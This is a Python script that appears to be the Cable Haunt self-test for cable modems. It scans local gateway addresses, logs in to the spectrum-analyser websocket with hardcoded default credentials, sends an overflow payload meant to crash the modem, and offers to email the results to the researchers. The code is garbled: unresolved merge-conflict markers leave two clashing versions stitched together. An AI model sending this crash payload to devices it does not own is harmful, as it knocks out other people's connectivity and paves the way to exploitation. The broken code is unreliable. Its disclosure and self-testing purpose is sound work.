import websockets
import webbrowser
import threading
import time
import socket
import concurrent.futures
import asyncio
from queue import Queue
from typing import Tuple
from html import unescape

debuging = True
validPayload = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":0,"fStopHz":1218000000,"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}'
crashPayload = '{"jsonrpc":"2.0","method":"Frontend::GetFrontendSpectrumData","params":{"coreID":0,"fStartHz":' + 'A'*200 + ',"fftSize":1024,"gain":1,"numOfSamples":1},"id":"0"}'
headers = {'Authorization': 'Basic c3BlY3RydW06c3BlY3RydW0='}
checkString = 'RPCResultObject'
timeoutTime = 20
tcpTimeOut = 0.1
print_lock = threading.Lock()
targets = ['192.168.100.1', '192.168.0.1']
portRange = range(23, 10000)
possibleTargets = []

def portscan(port, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(tcpTimeOut)
    try:
        con = s.connect((ip, port))
        with print_lock:
            print(ip, ":", port)
            possibleTargets.append((ip, port))
        con.close()
    except:
        pass

def threader():
    while True:
        port, ip = q.get()
        portscan(port, ip)
        q.task_done()
        
q = Queue()
for x in range(30):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

print("Scanning ports between", portRange.start, "and",
      portRange.stop, " for adresses: ", targets)

for ip in targets:
    for port in portRange:
        q.put((port, ip))
q.join()

async def sendSpectrumData(ipPort: Tuple[str, int], data: str):
    uri = 'ws://' + ipPort[0] + ':' + str(ipPort[1]) + '/Frontend'
    async with websockets.connect(uri, extra_headers=headers, subprotocols=['rpc-frontend']) as websocket:
        await websocket.send(data)
        resp = await asyncio.wait_for(websocket.recv(), timeoutTime)
    return resp

victims = []
for x in possibleTargets:
    try:
        resp = asyncio.get_event_loop().run_until_complete(sendSpectrumData(x, validPayload))
        print(resp)
<<<<<<< HEAD
        if checkString in resp:
            victims.append(x)
            print(x, "Spectrum Analyser found here (searching for more endpoints)")
        else:
            print(x, "is a websocket endpoint but not the Spectrum Analyzer")
    except (websockets.exceptions.WebSocketException) as e:
        print(x, "is not a websocket endpoint (WebSocketException:", str(e) +")")
        resp = ''
    except asyncio.exceptions.TimeoutError as e:
        print(x, "is a websocket endpoint but not the Spectrum Analyzer (TimeoutError:", str(e) + ")")
=======
    except (InvalidHandshake, ConnectionClosed) as e:
        print(x, "is not a websocket endpoint (InvalidHandshake or ConnectionClosed: ", e, ")")
        resp = ''
    except asyncio.TimeoutError as e:
        print(x, "is not a websocket endpoint (TimeoutError:", e, ")")
>>>>>>> e84d61fa9dd4b0164d2b922bcf713a54d12f38a7
        resp = ''
    except UnicodeDecodeError as e:
        print(x, "is not a websocket endpoint (UnicodeDecodeError:", str(e) + ")")
        resp = ''
    except TypeError as e:
        print(x, "is not a websocket endpoint (TypeError:", str(e) + ")")
        resp = ''

emailString = "Hello Cable Haunt, I have tested my modem for the vulnerability."
vulnerableEndpoint = None
vulnerableModems = []
if victims:
    print('Found the spectrum analyser on these ip and ports: ')
    print(victims)
    print("If we continue your modem might reboot, do you want to continue? (Y/n)")
    x = input()
    if x != "n" and x != "N":
        print('Sending crash payload')
        print('If modem crashes you are vulnerable to Cable Haunt.')
        for x in victims:
            try:
                resp = asyncio.get_event_loop().run_until_complete(sendSpectrumData(x, crashPayload))
                if checkString in resp:
                    print('Found not vulnerable modem at:')
                    print(x)
                    vulnerableEndpoint = x
            except (websockets.exceptions.WebSocketException, asyncio.exceptions.TimeoutError) as e:
                print('Found vulnerable modem at:')
                print(x)
<<<<<<< HEAD
else:
    print('We could not find ip and port for spectrum analyzer. This could mean you are not vulnerable or that we did not test on the correct IP. Please refer to the repo if you want to expand tho list of IPs you are scanning.')

print("Thank you for testing your modem, do you want to send your results to Cable Haunt? (Y/n)")
ans = input()
if ans != "n" and ans != "N":
    print("Who produced your modem? (Leave blank if unknown): ")
    emailString += "%0D%0AManufacturer: " + input()
    print("What is the model? (Leave blank if unknown): ")
    emailString += "%0D%0AModel: " + input()
    print("What is the firmware version? (Leave blank if unknown): ")
    emailString += "Â­%0D%0AFW: " + input()
    emailString += "%0D%0A====================================%0D%0A"
    emailString += str(x) + "%0D%0A"
    emailString += str(targets) + "%0D%0A"
    emailString += str(portRange) + "%0D%0A"
    emailString += str(checkString) + "%0D%0A"
    emailString += str(headers) + "%0D%0A"
    emailString += str(timeoutTime) + "%0D%0A"
    emailString += str(validPayload) + "%0D%0A"
    emailString += str(crashPayload)
    webbrowser.open("mailto:cablehaunt@lyrebirds.dk?subject=Cable Haunt modem test&body=" + unescape(emailString))
=======
        except (ConnectionClosed, asyncio.TimeoutError) as e:
            print('found vulnerable modem at:')
            print(x)
else:
    print('we could not find ip and port for spectrum analyzer, this could mean you are not vulnerable') (edited)
>>>>>>> e84d61fa9dd4b0164d2b922bcf713a54d12f38a7
